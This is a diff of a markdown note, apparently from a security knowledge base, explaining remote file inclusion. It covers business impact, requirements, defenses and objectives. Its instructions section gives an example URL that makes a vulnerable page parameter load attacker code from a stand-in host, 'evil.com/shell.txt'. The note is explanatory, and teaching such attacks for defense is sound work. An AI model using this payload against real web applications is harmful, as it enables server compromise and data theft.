@@ -31,9 +31,13 @@ Technical Explanation: The attacker crafts a URL that includes a remote file, wh
 
 Business Value: This attack can be used to gain unauthorized access to sensitive data stored on the server. This can result in financial loss, reputation damage, and legal consequences. It is important for organizations to implement proper input validation and access controls to prevent this type of attack.
 
+ 
+
 ## Requirements
 
 1. Access to the vulnerable web application
+
+ 
 
 ## Defense
 
@@ -43,15 +47,25 @@ Business Value: This attack can be used to gain unauthorized access to sensitive
 
 1. Monitor web server logs for suspicious activity and investigate any anomalies.
 
+ 
+
 ## Objectives
 
 1. Gain unauthorized access to sensitive data stored on the server
+
+ 
 
 # Instructions
 
 1. 
 
+ 
+
+
+
 **Code**: [[http://example.com/index.php?page=http://evil.com/]]
+
+
 
 > - 'http://example.com/index.php?page=' is the vulnerable parameter that allows the attacker to include a remote file.
 - 'http://evil.com/shell.txt' is the remote file that the attacker wants to include. The file contains the code that the attacker wants to execute on the server.
@@ -70,3 +84,5 @@ Business Value: This attack can be used to gain unauthorized access to sensitive
 
 - [[Basic RFI]]
 - [[File Inclusion]]
+
+
